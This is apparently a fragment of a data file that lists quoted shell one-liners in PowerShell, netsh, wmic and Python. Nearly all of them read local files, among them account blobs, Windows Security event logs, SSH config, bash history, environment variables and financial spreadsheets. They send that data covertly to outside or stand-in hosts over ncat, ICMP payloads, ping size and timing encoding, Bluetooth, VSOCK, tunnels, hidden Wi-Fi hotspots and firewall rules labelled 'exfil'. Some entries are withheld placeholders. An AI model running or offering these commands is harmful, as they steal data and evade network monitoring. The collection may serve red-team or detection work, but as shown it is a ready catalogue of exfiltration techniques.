  "netsh wlan set hostednetwork mode=allow ssid=DiagWiFi key=Passw0rd! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction SilentlyContinue; if($hn){New-NetIPAddress -InterfaceIndex $hn.ifIndex -IPAddress 192.168.88.1 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 192.168.88.2 -p 63456 -B 192.168.88.1 -t 40\"}",
  "netsh wlan set hostednetwork mode=allow ssid=svc_diag key=K0mp!exP@ss! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $hn.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 60789 -B $ip\"",
  "netsh mbn connect interface=\"Cellular\" connmode=name name=\"CorpBypass\" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 100.72.55.9 -p 53433 -B $ip -t 60\"",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u 2001:db8:dead:beef::20 57344 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
  "$src=(Get-NetIPAddress -InterfaceAlias 'Wi-Fi' -AddressFamily IPv6 | ?{$_.AddressState -eq 'Preferred'} | Select-Object -First 1 -ExpandProperty IPAddress); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -s $src 2001:db8:dead:beef::23 47017 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --udp --dest-port 56123 --data-string $b -c 3 --rate 1 2001:db8:dead:beef::22",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
  "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe --icmp -6 2001:db8:dead:beef::10 --data-string $b -c 1",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); [Text.RegularExpressions.Regex]::Matches($b,'.{1,900}') | ForEach-Object { $_.Value; Start-Sleep -Milliseconds 120 } | ncat.exe -6 2001:db8:dead:beef::27 63999 --send-only",
  "netsh advfirewall firewall add rule name=\"exfil_out_udp_60445\" dir=out action=allow enable=yes protocol=UDP remoteport=60445 remoteip=198.51.100.42 profile=any",
  "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
  "netsh interface portproxy add v6tov4 listenaddress=::1 listenport=49205 connectaddress=203.0.113.77 connectport=49206",
  "netsh interface isatap set state state=enabled; netsh interface isatap set router isatap.exfil.tld",
  "netsh interface ipv6 add v6v4tunnel exfiltun 192.0.2.25 198.51.100.25; netsh interface ipv6 add address exfiltun 2001:db8:100:1::2; netsh interface ipv6 add route 2001:db8:200::/48 exfiltun 2001:db8:100:1::1",
  "netsh interface teredo set state type=enterpriseclient servername=teredo.exfil.tld clientport=60445",
  "netsh interface 6to4 set state enabled relay=198.51.100.42",
  "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=49333 connectaddress=198.51.100.88 connectport=49334",
  "netsh interface portproxy add v4tov6 listenaddress=127.0.0.1 listenport=49171 connectaddress=2001:db8:ac:1::beef connectport=49172",
  "netsh interface portproxy add v6tov6 listenaddress=::1 listenport=49601 connectaddress=2001:db8:4444::1 connectport=49602",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Hamachi*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.166',59322); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Downloads\\pack.data'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and `$_.Description -like '*Bluetooth*' }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.77',53123); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\sync.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Cellular*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.9',57483); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\cache.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*1394*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.44',56112); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\frame.buf'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Wi-Fi Direct*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.210',61234); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\wfd_chunk.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Teredo*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8::50'); `$c.Connect(`$rv6,53456); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Diagnostics\\etl.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
  "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
  "$d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\\Users\\Public\\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }",
  "$d='fe80::a%11'; $s=Get-Content -Path 'C:\\Users\\Public\\message.txt' -Raw; $s.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (700 + [byte][char]$_) -IPv6 -Quiet | Out-Null }",
  "$d='fd00:abba::1'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d -Count 1 -TimeToLive (70 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $d -Count 1 -TimeToLive (100 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }",
  "$dh='fd00:feed::a'; $dl='fd00:feed::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $dh -Count 1 -BufferSize (400 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $dl -Count 1 -BufferSize (400 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d='fe80::babe:dead:beef:1%12'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (300 + $_) -IPv6 -Quiet | Out-Null }",
  "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name=\"$($ad.Name)\" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.2 255.255.255.252 | Out-Null; $data=[IO.File]::ReadAllBytes('C:\\Users\\Public\\fin.xlsx'); $b64=[Convert]::ToBase64String($data); $tcp=New-Object Net.Sockets.TcpClient; $tcp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.2'),0)); $tcp.Connect('172.25.83.1',52319); $ns=$tcp.GetStream(); $buf=[Text.Encoding]::UTF8.GetBytes($b64); $ns.Write($buf,0,$buf.Length); $ns.Close(); $tcp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $i=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$i\" static 10.226.38.2 255.255.255.252 | Out-Null; $buf=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\song.mp3'); $b=[Convert]::ToBase64String($buf); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.226.38.2'),0)); $cli.Connect('10.226.38.1',54295); $ns=$cli.GetStream(); [byte[]]$head=[Text.Encoding]::UTF8.GetBytes('POST /d HTTP/1.0`r`nX: bt`r`n`r`n'); $ns.Write($head,0,$head.Length); $bts=[Text.Encoding]::UTF8.GetBytes($b); $ns.Write($bts,0,$bts.Length); $ns.Close(); $cli.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.224.17.2 255.255.255.252 | Out-Null; $q=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\q3-report.docx')); $t=New-Object Net.Sockets.TcpClient; $t.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.224.17.2'),0)); $t.Connect('10.224.17.1',53337); $st=$t.GetStream(); $req=[Text.Encoding]::UTF8.GetBytes(('GET /u?d='+[Uri]::EscapeDataString($q)+' HTTP/1.1`r`nHost: x`r`nConnection: close`r`n`r`n')); $st.Write($req,0,$req.Length); $st.Close(); $t.Close()",
  "python3 -c \"import socket,os,time; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('33:44:55:66:77:88', 23)); p=os.path.expanduser('~/.gitconfig'); d=open(p,'rb').read(); [s.send(d[i:i+512]) or time.sleep(0.05) for i in range(0,len(d),512)]; s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('64:6E:6C:AA:BB:CC', 0x1009)); p=os.path.expanduser('~/.ssh/config'); import sys; d=b'';\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\ntry:\\n d=open(p,'rb').read()\\nexcept Exception:\\n d=b''\\nfinally:\\n s.sendall(d); s.close()\"",
  "python3 -c \"import socket,os,platform; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((4, 53211)); payload=('uid='+str(os.getuid())+' host='+platform.node()+'\\n').encode(); s.sendall(payload); s.close()\"",
  "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((3, 58821)); p=os.path.expanduser('~/.config/gtk-3.0/bookmarks'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
  "[withheld — non-actionable: would send base64-encoded data in fixed-size chunks via IPv6 UDP (AF_INET6/SOCK_DGRAM) to a unique-local address with a low hop-limit]",
  "[withheld — non-actionable: would send base64-encoded data via IPv6 UDP to a link-local target using a specified scope ID, segmenting payload to avoid detection and common ports]",
  "[withheld — non-actionable: would bind an IPv4 UDP socket to a secondary/non-default local address, optionally set DSCP/TOS, and transmit base64-encoded chunks to a high-numbered port]",
  "[withheld — non-actionable: would set SO_DONTROUTE on an IPv4 TCP socket, bind to a non-default local address, connect to a high, uncommon port, and send base64-encoded data]",
  "[withheld — non-actionable: would use IPv6 UDP with a specified traffic class (if available) to send base64-encoded chunks to a unicast destination on a high, uncommon port]",
  "[withheld — non-actionable: would bind an IPv6 TCP socket to a non-default link-local source address (scope-indexed) before connecting to a unique-local IPv6 target on a high port, then send base64 data]",
  "[withheld — non-actionable: would bind an IPv4 UDP socket to an APIPA/isolated adapter address and send base64-encoded chunks to a peer on an uncommon UDP port with low TTL]",
  "[withheld — non-actionable: would open an IPv6 TCP socket (AF_INET6) scoped to a link-local interface and transmit base64-encoded file data to a high, uncommon port]",
  "[withheld — non-actionable: would craft ICMP Echo Request packets (AF_INET/SOCK_RAW, IPPROTO_ICMP) carrying base64-encoded payload segments with proper checksums]",
  "[withheld — non-actionable: would enforce IPv6-only on a TCP socket and send base64-encoded data to a unique-local IPv6 service listening on an uncommon port]",
  "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
  "python3 -c 'import socket,datetime; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"198.51.100.23\", 49201)); prefix=(\"<34>1 \"+datetime.datetime.utcnow().isoformat()+\"Z macos app - - - \").encode(); s.sendall(prefix+open(\"/Users/Shared/.slog\",\"rb\").read()); s.close()'",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.88\", 52689)); d=open(\"/Users/Shared/.rpt\",\"rb\").read(); s.sendall(struct.pack(\"!I\",len(d))+d); s.close()'",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP); s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1); addr=(\"239.197.3.9\", 49321); d=open(\"/Users/Shared/.localstate\",\"rb\").read(); [s.sendto(d[i:i+800], addr) for i in range(0,len(d),800)]; s.close()'",
